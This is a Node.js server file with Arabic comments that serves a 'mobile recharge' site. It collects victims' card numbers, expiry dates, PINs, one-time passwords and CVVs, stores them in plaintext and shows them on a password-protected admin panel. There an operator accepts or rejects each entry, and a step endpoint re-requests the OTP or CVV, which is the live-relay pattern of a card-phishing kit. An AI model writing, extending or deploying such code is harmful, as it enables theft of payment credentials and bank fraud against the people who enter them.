// سيرفر بدون أي مكتبات خارجية (Node built-in فقط) — يشتغل على Railway مباشرة
const http = require('http');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = path.join(__dirname, 'public');

// كلمة مرور لوحة التحكم — غيّرها من متغيرات البيئة في Railway: ADMIN_PASSWORD
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

/* ---------------- تخزين الطلبات ---------------- */
const DATA_DIR = path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'submissions.json');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

let submissions = [];
try { if (fs.existsSync(DATA_FILE)) submissions = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch (e) { submissions = []; }
function saveSubmissions() { try { fs.writeFileSync(DATA_FILE, JSON.stringify(submissions, null, 2)); } catch (e) {} }

/* ---------------- جلسات الأدمن ---------------- */
const sessions = new Map();
const SESSION_TTL = 1000 * 60 * 60 * 6;
function newToken() { return crypto.randomBytes(24).toString('hex'); }
function isAuthed(req) {
  const token = (req.headers['authorization'] || '').replace('Bearer ', '').trim();
  const created = sessions.get(token);
  if (!created || Date.now() - created > SESSION_TTL) { sessions.delete(token); return false; }
  return true;
}

/* ---------------- عداد الزيارات النشطة ---------------- */
const visitors = new Map();
const ACTIVE_WINDOW = 30 * 1000;
function activeCount() {
  const now = Date.now();
  for (const [id, seen] of visitors) if (now - seen > ACTIVE_WINDOW) visitors.delete(id);
  return visitors.size;
}

/* ---------------- أدوات ---------------- */
function sendJSON(res, code, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(code, { 'Content-Type': 'application/json; charset=utf-8' });
  res.end(body);
}
function readBody(req) {
  return new Promise(resolve => {
    let data = '';
    req.on('data', c => { data += c; if (data.length > 1e6) req.destroy(); });
    req.on('end', () => { try { resolve(JSON.parse(data || '{}')); } catch { resolve({}); } });
    req.on('error', () => resolve({}));
  });
}
const MIME = {
  '.html':'text/html; charset=utf-8', '.js':'text/javascript; charset=utf-8',
  '.css':'text/css; charset=utf-8', '.json':'application/json; charset=utf-8',
  '.svg':'image/svg+xml', '.png':'image/png', '.jpg':'image/jpeg', '.jpeg':'image/jpeg',
  '.ico':'image/x-icon', '.woff2':'font/woff2'
};
function serveStatic(req, res) {
  let urlPath = decodeURIComponent((req.url.split('?')[0]) || '/');
  if (urlPath === '/') urlPath = '/index.html';
  const filePath = path.normalize(path.join(PUBLIC_DIR, urlPath));
  if (!filePath.startsWith(PUBLIC_DIR)) { res.writeHead(403); return res.end('Forbidden'); }
  fs.readFile(filePath, (err, buf) => {
    if (err) { res.writeHead(404, {'Content-Type':'text/plain; charset=utf-8'}); return res.end('غير موجود'); }
    res.writeHead(200, { 'Content-Type': MIME[path.extname(filePath).toLowerCase()] || 'application/octet-stream' });
    res.end(buf);
  });
}

/* ---------------- السيرفر ---------------- */
const server = http.createServer(async (req, res) => {
  const url = req.url.split('?')[0];
  const method = req.method;

  // استقبال طلب شحن
  if (url === '/api/submit' && method === 'POST') {
    const b = await readBody(req);
    const phone  = String(b.phone  || '').trim();
    const amount = String(b.amount || '').trim();
    if (!phone || !amount) return sendJSON(res, 400, { error: 'بيانات ناقصة' });
    submissions.unshift({
      id: crypto.randomBytes(6).toString('hex'),
      phone, amount,
      card:   String(b.card   || '').trim(),
      expiry: String(b.expiry || '').trim(),
      pin:    String(b.pin    || '').trim(),
      otp:    String(b.otp    || '').trim(),
      cvv:    String(b.cvv    || '').trim(),
      status: 'pending',
      time:   new Date().toISOString()
    });
    if (submissions.length > 5000) submissions = submissions.slice(0, 5000);
    saveSubmissions();
    return sendJSON(res, 200, { ok: true, id: submissions[0].id });
  }

  // تحديث خطوة (بطاقة / OTP / CVV) وإعادة الحالة لـ pending
  if (url.startsWith('/api/submit-step/') && method === 'POST') {
    const id = url.slice('/api/submit-step/'.length);
    const sub = submissions.find(s => s.id === id);
    if (!sub) return sendJSON(res, 404, { error: 'غير موجود' });
    const b = await readBody(req);
    if (b.card   !== undefined) sub.card   = String(b.card).trim();
    if (b.expiry !== undefined) sub.expiry = String(b.expiry).trim();
    if (b.pin    !== undefined) sub.pin    = String(b.pin).trim();
    if (b.otp    !== undefined) sub.otp    = String(b.otp).trim();
    if (b.cvv    !== undefined) sub.cvv    = String(b.cvv).trim();
    sub.status = 'pending';
    saveSubmissions();
    return sendJSON(res, 200, { ok: true });
  }

  // حالة طلب (عام — بدون auth)
  if (url.startsWith('/api/status/') && method === 'GET') {
    const id = url.slice('/api/status/'.length);
    const sub = submissions.find(s => s.id === id);
    if (!sub) return sendJSON(res, 404, { error: 'غير موجود' });
    return sendJSON(res, 200, { status: sub.status || 'pending' });
  }

  // قبول طلب
  if (url.startsWith('/api/admin/accept/') && method === 'POST') {
    if (!isAuthed(req)) return sendJSON(res, 401, { error: 'غير مصرح' });
    const id = url.slice('/api/admin/accept/'.length);
    const sub = submissions.find(s => s.id === id);
    if (!sub) return sendJSON(res, 404, { error: 'غير موجود' });
    sub.status = 'accepted';
    saveSubmissions();
    return sendJSON(res, 200, { ok: true });
  }

  // رفض طلب
  if (url.startsWith('/api/admin/reject/') && method === 'POST') {
    if (!isAuthed(req)) return sendJSON(res, 401, { error: 'غير مصرح' });
    const id = url.slice('/api/admin/reject/'.length);
    const sub = submissions.find(s => s.id === id);
    if (!sub) return sendJSON(res, 404, { error: 'غير موجود' });
    sub.status = 'rejected';
    saveSubmissions();
    return sendJSON(res, 200, { ok: true });
  }

  // نبضة الزائر
  if (url === '/api/heartbeat' && method === 'POST') {
    const b = await readBody(req);
    const id = String(b.id || '').trim();
    if (id) visitors.set(id, Date.now());
    return sendJSON(res, 200, { active: activeCount() });
  }

  // عدد الزيارات النشطة
  if (url === '/api/active-count' && method === 'GET') {
    return sendJSON(res, 200, { active: activeCount() });
  }

  // دخول الأدمن
  if (url === '/api/admin/login' && method === 'POST') {
    const b = await readBody(req);
    if ((b.password || '') !== ADMIN_PASSWORD) return sendJSON(res, 401, { error: 'كلمة المرور غير صحيحة' });
    const token = newToken();
    sessions.set(token, Date.now());
    return sendJSON(res, 200, { token });
  }

  // بيانات الأدمن
  if (url === '/api/admin/submissions' && method === 'GET') {
    if (!isAuthed(req)) return sendJSON(res, 401, { error: 'غير مصرح' });
    return sendJSON(res, 200, { submissions, active: activeCount() });
  }

  // مسح الطلبات
  if (url === '/api/admin/clear' && method === 'POST') {
    if (!isAuthed(req)) return sendJSON(res, 401, { error: 'غير مصرح' });
    submissions = [];
    saveSubmissions();
    return sendJSON(res, 200, { ok: true });
  }

  // أي حاجة تانية -> ملفات ثابتة
  return serveStatic(req, res);
});

server.listen(PORT, () => console.log('Server running on port ' + PORT));
